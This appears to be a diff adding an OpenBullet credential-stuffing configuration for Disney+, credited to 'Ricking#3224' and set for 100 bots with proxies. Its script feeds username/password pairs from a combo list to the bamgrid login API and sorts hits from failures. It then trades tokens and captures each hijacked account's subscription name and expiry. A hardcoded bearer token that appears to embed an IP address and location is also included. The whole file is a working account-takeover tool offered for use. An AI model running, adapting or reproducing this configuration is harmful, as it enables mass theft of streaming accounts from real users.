@@ -1,0 +1,143 @@
+[SETTINGS]
+{
+  "Name": "DisneyPlusOBC",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-20T17:06:17.8926459-05:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.1.0 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Constant "disney-svod-3d9324fc" -> VAR "clientid" 
+
+FUNCTION Constant "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84" -> VAR "bearer" 
+
+REQUEST POST "https://global.edge.bamgrid.com/idp/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://www.disneyplus.com" 
+  HEADER "x-bamsdk-client-id: <clientid>" 
+  HEADER "authorization: Bearer eyJraWQiOiI4ODA0OGI3MS1jMjhlLTQ5MDQtYWMwOS03NzdiMTFmNzUyNDAiLCJhbGciOiJFZERTQSJ9.eyJzdWIiOiJhY2U3MjYyNy1jYmZlLTQwZDYtOGVhNy0xMjNlZDUwY2YxOGYiLCJuYmYiOjE2MTM4NTgyNTksInBhcnRuZXJOYW1lIjoiZGlzbmV5IiwiaXNzIjoidXJuOmJhbXRlY2g6c2VydmljZTp0b2tlbiIsImNvbnRleHQiOnsiYWN0aXZlX3Byb2ZpbGVfaWQiOiI0MGNiZGVmMS0xMzFhLTQzZWYtOTg4Yy1iY2RjMDI3MjVjMTkiLCJ1cGRhdGVkX29uIjoiMjAyMS0wMi0yMFQyMTo1NzozOS4xMjQrMDAwMCIsInN1YnNjcmlwdGlvbnMiOltdLCJjb3VudHJ5X3NldHRpbmdzIjp7ImNvZGUiOiJVUyIsInRpbWV6b25lIjp7InV0Y19vZmZzZXQiOiItMDU6MDAiLCJuYW1lIjoiQW1lcmljYVwvTmV3X1lvcmsifSwicmF0aW5nX3N5c3RlbXMiOlsibXBhYSIsInR2cGciXX0sImV4cGlyZXNfb24iOiIyMDIxLTAyLTIxVDAxOjU3OjM5LjEyNCswMDAwIiwiZXhwZXJpbWVudHMiOnt9LCJwcm9maWxlcyI6W3siZ3JvdXBfd2F0Y2giOnsiZW5hYmxlZCI6dHJ1ZX0sImtpZHNfbW9kZV9lbmFibGVkIjpmYWxzZSwicGxheWJhY2tfc2V0dGluZ3MiOnsicHJlZmVyXzEzMyI6ZmFsc2V9LCJwYXJlbnRhbF9jb250cm9scyI6eyJwaW5fZW50cnlfZXhwaXJlc19hdCI6IiIsIm1hdHVyaXR5X3JhdGluZyI6eyJyYXRpbmdfc3lzdGVtIjoiTVBBQUFuZFRWUEciLCJjb250ZW50X21hdHVyaXR5X3JhdGluZyI6IlRWLTE0IiwiaW1wbGllZF9tYXR1cml0eV9yYXRpbmciOjB9LCJpc19hZ2UyMV92ZXJpZmllZCI6ZmFsc2UsImlzX3Bpbl9wcm90ZWN0ZWQiOmZhbHNlLCJlbmFibGVkIjp0cnVlfSwiYWN0aXZlIjp0cnVlLCJpZCI6IjQwY2JkZWYxLTEzMWEtNDNlZi05ODhjLWJjZGMwMjcyNWMxOSIsImF2YXRhciI6eyJpZCI6IjQ0MmFmN2RiLTg1ZjctNWUxZC05NmYwLWIyYzUxN2JlNDA4NSJ9LCJ0eXBlIjoidXJuOmJhbXRlY2g6cHJvZmlsZSIsImxhbmd1YWdlX3ByZWZlcmVuY2VzIjp7ImFwcF9sYW5ndWFnZSI6ImVuLUdCIiwicGxheWJhY2tfbGFuZ3VhZ2UiOiJlbi1HQiIsInN1YnRpdGxlX2xhbmd1YWdlIjoiZW4tR0IifX1dLCJpcF9hZGRyZXNzIjoiMTg0LjEwNS4xODguMTkwIiwidHlwZSI6IkFOT05ZTU9VUyIsInZlcnNpb24iOiJWMi4wLjAiLCJibGFja291dHMiOnsiZW50aXRsZW1lbnRzIjpbXSwiZGF0YSI6e30sInJ1bGVzIjp7InZpb2xhdGVkIjpbXX19LCJwYXJ0bmVyIjp7Im5hbWUiOiJkaXNuZXkifSwibG9jYXRpb24iOnsiY291bnRyeV9jb2RlIjoiVVMiLCJjaXR5X25hbWUiOiJmcmVtb250IiwiY29ubmVjdGlvbl90eXBlIjoidHgiLCJzdGF0ZV9uYW1lIjoiY2FsaWZvcm5pYSIsImRtYSI6ODA3LCJyZWdpb25fbmFtZSI6InNvdXRod2VzdCIsInR5cGUiOiJaSVBfQ09ERSIsImFzbiI6Mzk0OTk2LCJ6aXBfY29kZSI6Ijk0NTM5In0sImdlbmVyYXRlZF9vbiI6IjIwMjEtMDItMjBUMjE6NTc6MzkuMTI0KzAwMDAiLCJpZCI6ImE2MDg0MjEwLTczYzYtMTFlYi1hMmQxLTAyNDJhYzExMDAwNiIsIm1lZGlhX3Blcm1pc3Npb25zIjp7ImVudGl0bGVtZW50cyI6W10sImRhdGEiOnt9LCJydWxlcyI6eyJwYXNzZWQiOltdfX0sImRldmljZSI6eyJhcHBfcnVudGltZSI6ImNocm9tZSIsInByb2ZpbGUiOiJ3aW5kb3dzIiwibW9kZWwiOiIiLCJpZCI6ImFjZTcyNjI3LWNiZmUtNDBkNi04ZWE3LTEyM2VkNTBjZjE4ZiIsInR5cGUiOiJ1cm46ZHNzOmRldmljZTppbnRlcm5hbCIsImZhbWlseSI6ImJyb3dzZXIiLCJwbGF0Zm9ybSI6ImJyb3dzZXIifSwicHJlZmVycmVkX21hdHVyaXR5X3JhdGluZyI6eyJyYXRpbmdfc3lzdGVtIjoiTVBBQUFuZFRWUEciLCJwcm9maWxlX2hhc19tYXR1cml0eV9yYXRpbmciOnRydWUsImltcGxpZWRfbWF0dXJpdHlfcmF0aW5nIjoxNDUwfSwic3VwcG9ydGVkIjp0cnVlfSwiZW52IjoicHJvZCIsImV4cCI6MTYxMzg3MjY1OSwiaWF0IjoxNjEzODU4MjU5LCJqdGkiOiI1YWZmMjEwOS1hZTMzLTRlZjktYWFhMi05NzA3YmU2MTViMzIifQ.Zbh30KvPlmEgUvOewHxji8vUCNzrCCUxFYOtgP_2qn_padTDJYAa-YTQ8m-6Lzg06WMKpXGReTJeffgkyIZ5BA" 
+  HEADER "content-type: application/json; charset=UTF-8" 
+  HEADER "x-bamsdk-version: 4.2" 
+  HEADER "accept: application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.disneyplus.com/login/password" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "bad-credentials" 
+  KEYCHAIN Success OR 
+    KEY "Bearer" 
+
+PARSE "<SOURCE>" JSON "id_token" -> VAR "idtoken" 
+
+REQUEST POST "https://global.edge.bamgrid.com/accounts/grant" 
+  CONTENT "{\"id_token\":\"<idtoken>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://www.disneyplus.com" 
+  HEADER "x-bamsdk-client-id: <clientid>" 
+  HEADER "authorization: Bearer eyJraWQiOiI4ODA0OGI3MS1jMjhlLTQ5MDQtYWMwOS03NzdiMTFmNzUyNDAiLCJhbGciOiJFZERTQSJ9.eyJzdWIiOiJhY2U3MjYyNy1jYmZlLTQwZDYtOGVhNy0xMjNlZDUwY2YxOGYiLCJuYmYiOjE2MTM4NTgyNTksInBhcnRuZXJOYW1lIjoiZGlzbmV5IiwiaXNzIjoidXJuOmJhbXRlY2g6c2VydmljZTp0b2tlbiIsImNvbnRleHQiOnsiYWN0aXZlX3Byb2ZpbGVfaWQiOiI0MGNiZGVmMS0xMzFhLTQzZWYtOTg4Yy1iY2RjMDI3MjVjMTkiLCJ1cGRhdGVkX29uIjoiMjAyMS0wMi0yMFQyMTo1NzozOS4xMjQrMDAwMCIsInN1YnNjcmlwdGlvbnMiOltdLCJjb3VudHJ5X3NldHRpbmdzIjp7ImNvZGUiOiJVUyIsInRpbWV6b25lIjp7InV0Y19vZmZzZXQiOiItMDU6MDAiLCJuYW1lIjoiQW1lcmljYVwvTmV3X1lvcmsifSwicmF0aW5nX3N5c3RlbXMiOlsibXBhYSIsInR2cGciXX0sImV4cGlyZXNfb24iOiIyMDIxLTAyLTIxVDAxOjU3OjM5LjEyNCswMDAwIiwiZXhwZXJpbWVudHMiOnt9LCJwcm9maWxlcyI6W3siZ3JvdXBfd2F0Y2giOnsiZW5hYmxlZCI6dHJ1ZX0sImtpZHNfbW9kZV9lbmFibGVkIjpmYWxzZSwicGxheWJhY2tfc2V0dGluZ3MiOnsicHJlZmVyXzEzMyI6ZmFsc2V9LCJwYXJlbnRhbF9jb250cm9scyI6eyJwaW5fZW50cnlfZXhwaXJlc19hdCI6IiIsIm1hdHVyaXR5X3JhdGluZyI6eyJyYXRpbmdfc3lzdGVtIjoiTVBBQUFuZFRWUEciLCJjb250ZW50X21hdHVyaXR5X3JhdGluZyI6IlRWLTE0IiwiaW1wbGllZF9tYXR1cml0eV9yYXRpbmciOjB9LCJpc19hZ2UyMV92ZXJpZmllZCI6ZmFsc2UsImlzX3Bpbl9wcm90ZWN0ZWQiOmZhbHNlLCJlbmFibGVkIjp0cnVlfSwiYWN0aXZlIjp0cnVlLCJpZCI6IjQwY2JkZWYxLTEzMWEtNDNlZi05ODhjLWJjZGMwMjcyNWMxOSIsImF2YXRhciI6eyJpZCI6IjQ0MmFmN2RiLTg1ZjctNWUxZC05NmYwLWIyYzUxN2JlNDA4NSJ9LCJ0eXBlIjoidXJuOmJhbXRlY2g6cHJvZmlsZSIsImxhbmd1YWdlX3ByZWZlcmVuY2VzIjp7ImFwcF9sYW5ndWFnZSI6ImVuLUdCIiwicGxheWJhY2tfbGFuZ3VhZ2UiOiJlbi1HQiIsInN1YnRpdGxlX2xhbmd1YWdlIjoiZW4tR0IifX1dLCJpcF9hZGRyZXNzIjoiMTg0LjEwNS4xODguMTkwIiwidHlwZSI6IkFOT05ZTU9VUyIsInZlcnNpb24iOiJWMi4wLjAiLCJibGFja291dHMiOnsiZW50aXRsZW1lbnRzIjpbXSwiZGF0YSI6e30sInJ1bGVzIjp7InZpb2xhdGVkIjpbXX19LCJwYXJ0bmVyIjp7Im5hbWUiOiJkaXNuZXkifSwibG9jYXRpb24iOnsiY291bnRyeV9jb2RlIjoiVVMiLCJjaXR5X25hbWUiOiJmcmVtb250IiwiY29ubmVjdGlvbl90eXBlIjoidHgiLCJzdGF0ZV9uYW1lIjoiY2FsaWZvcm5pYSIsImRtYSI6ODA3LCJyZWdpb25fbmFtZSI6InNvdXRod2VzdCIsInR5cGUiOiJaSVBfQ09ERSIsImFzbiI6Mzk0OTk2LCJ6aXBfY29kZSI6Ijk0NTM5In0sImdlbmVyYXRlZF9vbiI6IjIwMjEtMDItMjBUMjE6NTc6MzkuMTI0KzAwMDAiLCJpZCI6ImE2MDg0MjEwLTczYzYtMTFlYi1hMmQxLTAyNDJhYzExMDAwNiIsIm1lZGlhX3Blcm1pc3Npb25zIjp7ImVudGl0bGVtZW50cyI6W10sImRhdGEiOnt9LCJydWxlcyI6eyJwYXNzZWQiOltdfX0sImRldmljZSI6eyJhcHBfcnVudGltZSI6ImNocm9tZSIsInByb2ZpbGUiOiJ3aW5kb3dzIiwibW9kZWwiOiIiLCJpZCI6ImFjZTcyNjI3LWNiZmUtNDBkNi04ZWE3LTEyM2VkNTBjZjE4ZiIsInR5cGUiOiJ1cm46ZHNzOmRldmljZTppbnRlcm5hbCIsImZhbWlseSI6ImJyb3dzZXIiLCJwbGF0Zm9ybSI6ImJyb3dzZXIifSwicHJlZmVycmVkX21hdHVyaXR5X3JhdGluZyI6eyJyYXRpbmdfc3lzdGVtIjoiTVBBQUFuZFRWUEciLCJwcm9maWxlX2hhc19tYXR1cml0eV9yYXRpbmciOnRydWUsImltcGxpZWRfbWF0dXJpdHlfcmF0aW5nIjoxNDUwfSwic3VwcG9ydGVkIjp0cnVlfSwiZW52IjoicHJvZCIsImV4cCI6MTYxMzg3MjY1OSwiaWF0IjoxNjEzODU4MjU5LCJqdGkiOiI1YWZmMjEwOS1hZTMzLTRlZjktYWFhMi05NzA3YmU2MTViMzIifQ.Zbh30KvPlmEgUvOewHxji8vUCNzrCCUxFYOtgP_2qn_padTDJYAa-YTQ8m-6Lzg06WMKpXGReTJeffgkyIZ5BA" 
+  HEADER "content-type: application/json; charset=UTF-8" 
+  HEADER "x-bamsdk-version: 4.2" 
+  HEADER "accept: application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.disneyplus.com/login/password" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" JSON "assertion" -> VAR "assertion" 
+
+REQUEST POST "https://global.edge.bamgrid.com/token" 
+  CONTENT "grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=<assertion>&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Aaccount" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://www.disneyplus.com" 
+  HEADER "x-bamsdk-client-id: <clientid>" 
+  HEADER "authorization: Bearer <bearer>" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "x-bamsdk-version: 4.2" 
+  HEADER "accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.disneyplus.com/login/password" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "accesstoken" 
+
+REQUEST GET "https://global.edge.bamgrid.com/subscriptions" 
+  
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://www.disneyplus.com" 
+  HEADER "x-bamsdk-client-id: disney-svod-3d9324fc" 
+  HEADER "authorization: Bearer <accesstoken>" 
+  HEADER "content-type: application/json; charset=utf-8" 
+  HEADER "x-bamsdk-version: 4.2" 
+  HEADER "accept: application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.disneyplus.com/login/password" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" JSON "name" -> CAP "Subscription" 
+
+PARSE "<SOURCE>" JSON "expirationDate" -> CAP "Expiration"
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "name" 
+    KEY "<Subscription>" EqualTo "" 
+
